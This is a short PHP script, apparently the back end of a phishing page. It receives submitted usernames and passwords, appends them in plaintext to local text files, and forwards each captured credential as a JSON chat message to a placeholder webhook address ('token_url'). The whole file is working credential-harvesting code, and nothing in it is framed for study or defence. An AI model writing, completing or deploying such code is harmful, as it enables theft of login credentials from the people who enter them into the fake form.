<?php
header('Content-Type: text/html; charset=utf-8');

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_POST["username"])) {
        $name = $_POST["username"];        
        if(file_put_contents("username.txt", $name . PHP_EOL, FILE_APPEND) !== false){
            $lines = file("username.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if ($lines === false) {
                echo "Error reading password file";
            } else {
                $lastLine = end($lines);
                    if ($lastLine === false) {
                        echo "Error reading last password";
                    } else {
                        $lastLine = trim($lastLine); // 使用 trim 来移除行尾的换行符和空格
                        $laststr1 = "username: " . $lastLine;
                        sendDataToServer($laststr1);
                        echo "Data sent to server successfully";
                    }
                }
        }
    }elseif(isset($_POST["password"])){
        $password = $_POST["password"];
        if (file_put_contents("passwords.txt", $password . PHP_EOL, FILE_APPEND) !== false) {
            echo "Password written to file successfully";

            // 读取txt文件的最后一行并发送到指定地址
            $lines = file("passwords.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if ($lines === false) {
                echo "Error reading password file";
            } else {
                $lastLine = end($lines);
                    if ($lastLine === false) {
                        echo "Error reading last password";
                    } else {
                        $lastLine = trim($lastLine); // 使用 trim 来移除行尾的换行符和空格
                        $laststr1 = "passwd: " . $lastLine;
                        sendDataToServer($laststr1);
                        echo "Data sent to server successfully";
                    }
                }
    }
}}

function sendDataToServer($data) {
    $url = "token_url"; // 替换为你要发送数据的目标地址

    $options = array(
        'http' => array(
            'header' => "Content-type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode(array("msg_type" => "text", "content" => array("text" => $data))
            )
        )
    );
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    if ($response !== FALSE) {
        echo "服务器响应: " . $response . "\n";
    } else {
        echo "发送数据到服务器时出错。\n";
    }
}
?>
